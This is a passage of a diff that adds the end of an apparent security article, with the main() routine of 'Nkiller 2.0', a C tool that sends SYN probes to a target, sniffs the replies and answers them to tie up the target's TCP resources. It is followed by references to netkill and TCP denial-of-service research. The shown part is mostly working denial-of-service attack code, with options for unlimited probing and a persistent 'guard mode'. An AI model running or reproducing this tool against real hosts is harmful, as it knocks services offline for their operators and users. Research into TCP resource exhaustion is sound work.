+  HostInfo *Target;
+  SniffInfo *Sniffer;
+  u_char *reply;
+  char *endp; 
+
+  srandom(time(0));
+
+  if (argc == 1) {
+    usage();
+  }
+
+  memset(&o, 0, sizeof(o));
+  unlimited = 0;
+  required = 0;
+  portlen = 0;
+  print_help = 0;
+  probe_byusr = 0;
+
+  probes = DEFAULT_NUM_PROBES;
+  o.sleep = DEFAULT_SLEEP_TIME;
+  o.probes_per_rnd = DEFAULT_PROBES_RND;
+  o.probe_interval = DEFAULT_PROBE_INTERVAL;
+  strncpy(o.skey, DEFAULT_KEY, sizeof(o.skey));
+  o.polltime = DEFAULT_POLLTIME;
+
+  /* Option parsing */
+  while ((opt = getopt(argc, argv, "t:k:l:w:c:p:n:vd:s:r:N:T:P:yhg"))
+      != -1)
+  {
+    switch (opt)
+    {
+      case 't':   /* target address */
+        strncpy(o.target, optarg, sizeof(o.target));
+        required++;
+        break;
+      case 'k':   /* secret key */
+        strncpy(o.skey, optarg, sizeof(o.skey));
+        break;
+      case 'l':   /* payload */
+        strncpy(o.payload, optarg, sizeof(o.payload) - 1);
+        break;
+      case 'w':  /* path */
+        strncpy(o.path, optarg, sizeof(o.path) - 1);
+        break;
+      case 'r':    /* vhost name */
+        strncpy(o.vhost, optarg, sizeof(o.vhost) -1);
+        break;
+      case 'c':   /* polltime */
+        endp = NULL;
+        o.polltime = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid polltime: %s\n", optarg);
+        break;
+      case 'p':   /* destination port */
+        if (!(o.portlist = port_parse(optarg, &portlen))) 
+          fatal("Couldn't parse ports!\n");
+        required++;
+        break;
+      case 'n':   /* number of probes */
+        endp = NULL;
+        o.probes = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid probe number: %s\n", optarg);
+        probe_byusr++;
+        if (!o.probes) {
+          unlimited++;
+          probe_byusr = 0;
+        }
+        break;
+      case 'N':    /* probes per round */
+        endp = NULL;
+        o.probes_per_rnd = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid probes-per-round number: %s\n", optarg);
+        break;
+      case 'T':    /* template number */
+        endp = NULL;
+        o.template = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid template number: %s\n", optarg);
+        break;
+      case 'P':    /* probe timer interval */
+        endp = NULL;
+        o.probe_interval = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid probe-interval number: %s\n", optarg);
+        break;
+      case 'g':  /* guard mode */
+        o.guardmode++;
+        break;
+      case 'v':  /* verbose mode */
+        o.verbose++;
+        break;
+      case 'd':  /* debug mode */
+        endp = NULL;
+        debug_level = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid probe number: %s\n", optarg);
+        if (debug_level != 1 && debug_level != 2)
+          fatal("Debug level must be either 1 or 2\n");
+        else if (debug_level == 1)
+          o.debug++;
+        else {
+          o.debug2++;
+          o.debug++;
+        }
+        break;
+      case 's':   /* sleep time between each probe */
+        endp = NULL;
+        o.sleep = strtoul(optarg, &endp, 0);
+        if (errno != 0 || *endp != '\0')
+          fatal("Invalid sleep number: %s\n", optarg);
+        break;
+      case 'y':   /* dynamic port handling */
+        o.dynamic++;
+        break;
+      case 'h':   /* help - usage */
+        print_help = 1;
+        break;
+      case '?':   /* error */
+        usage();
+        break;
+    }
+  }
+
+  if (print_help) {
+    help();
+    exit(EXIT_SUCCESS);
+  }
+
+  if (getuid() && geteuid())
+    fatal("You need to be root.\n");
+
+  if (required < 2)
+    fatal("You have to define both -t <target> and -p <portlist>\n");
+
+  (void) fprintf(stdout, "\nStarting Nkiller 2.0 "
+      "( http://sock-raw.org )\n");
+
+  Target = xmalloc(sizeof(HostInfo));
+  Sniffer = xmalloc(sizeof(SniffInfo));
+
+  Target->portlen = portlen;
+  for (i = 0; i < Target->portlen; i++)
+    port_add(Target, o.portlist[i]);
+
+  if (!unlimited && probe_byusr)
+    probes = o.probes;
+
+  inet_pton(AF_INET, o.target, &Target->daddr);
+
+  handle_payloads(Target);
+  sniffer_init(Target, Sniffer);
+
+  if (o.verbose) {
+    if (unlimited) 
+      (void) fprintf(stdout, "Probes: unlimited\n");
+    else 
+      (void) fprintf(stdout, "Probes: %u\n", probes);
+    (void) fprintf(stdout, 
+        "Probes per round: %u\n"
+        "Pcap polling time: %u microseconds\n"
+        "Sleep time: %u microseconds\n"
+        "Key: %s\n"
+        "Probe interval: %u seconds\n"
+        "Template: %s\n", o.probes_per_rnd, o.polltime,
+        o.sleep, o.skey, o.probe_interval, get_template(o.template));
+    if (o.guardmode)
+      (void) fprintf(stdout, "Guardmode on\n");
+  }
+
+  probes_sent = 0;
+  probes_left = probes;
+  probes_rnd_fini = 0;
+  probes_this_rnd = 0;
+
+  /* Main loop */
+  while (probes_left || o.guardmode || unlimited) {
+
+    if (probes_rnd_fini >= o.probes_per_rnd) {
+      probes_rnd_fini = 0;
+      probes_this_rnd = 0;
+    }
+
+    if (!unlimited && probes_left == (0.5 * probes) && o.verbose)
+      (void) fprintf(stdout, "Half of probes left.\n");
+
+    if (probes_sent < probes && probes_this_rnd < o.probes_per_rnd) {
+      send_syn_probe(Target, Sniffer);
+      if (!unlimited)
+        probes_sent++;
+      probes_this_rnd++;
+    }
+
+    usleep(o.sleep);  /* Wait a bit before each probe */
+
+    state = check_replies(Target, Sniffer, &reply);
+
+    switch (state) 
+    {
+      case S_ERR: 
+        continue;
+        break;
+      case S_SYNACK:
+        send_probe(reply, Target, S_SYNACK);
+        free(reply);
+        break;
+      case S_FDACK:
+        continue;
+        break;
+      case S_PROBE:
+        send_probe(reply, Target, S_PROBE);
+        free(reply);
+        probes_rnd_fini++;
+        if (!unlimited)
+          probes_left--;
+        break;
+      case S_DATA_0:
+        send_probe(reply, Target, S_DATA_0);
+        free(reply);
+        if (o.template == T_BSDWIN)
+          probes_rnd_fini++;
+        break;
+      case S_DATA_1:
+        send_probe(reply, Target, S_DATA_1);
+        free(reply);
+        /* Increase aggressiveness */
+        probes_rnd_fini++; 
+        break;
+      default:
+        break;
+    }
+
+  }
+
+  (void) fprintf(stdout, "Finished.\n");
+  exit(EXIT_SUCCESS);
+}
+
+
+
+-- [ 6 - References
+
+[1]. netkill - generic remote DoS attack by stanislav shalunov -
+http://seclists.org/bugtraq/2000/Apr/0152.html
+
+[2]. TCP DoS Vulnerabilities by Fabian 'fabs' Yamaguchi -
+http://www.recurity-labs.com/content/pub/25C3TCPVulnerabilities.pdf
+
+[3]. TCP/IP Illustrated vol. 1 - W. Richard Stevens
+
+[4]. Linux Kernel Development (Chapter 10 - Timers and Time Management)
+  - Robert Love
+
+Additional related material:
+
+[5]. Understanding Linux Network Internals (O'reilly)
+
+[6]. Understanding the Linux Kernel (O'reilly)
+
+[7]. Dave Miller's TCP notes:
+      - http://vger.kernel.org/~davem/tcp_output.html
+      - http://vger.kernel.org/~davem/tcp_skbcb.html
+
+[8]. The Design and Implementation of the FreeBSD Operating System
+
+--------[ EOF
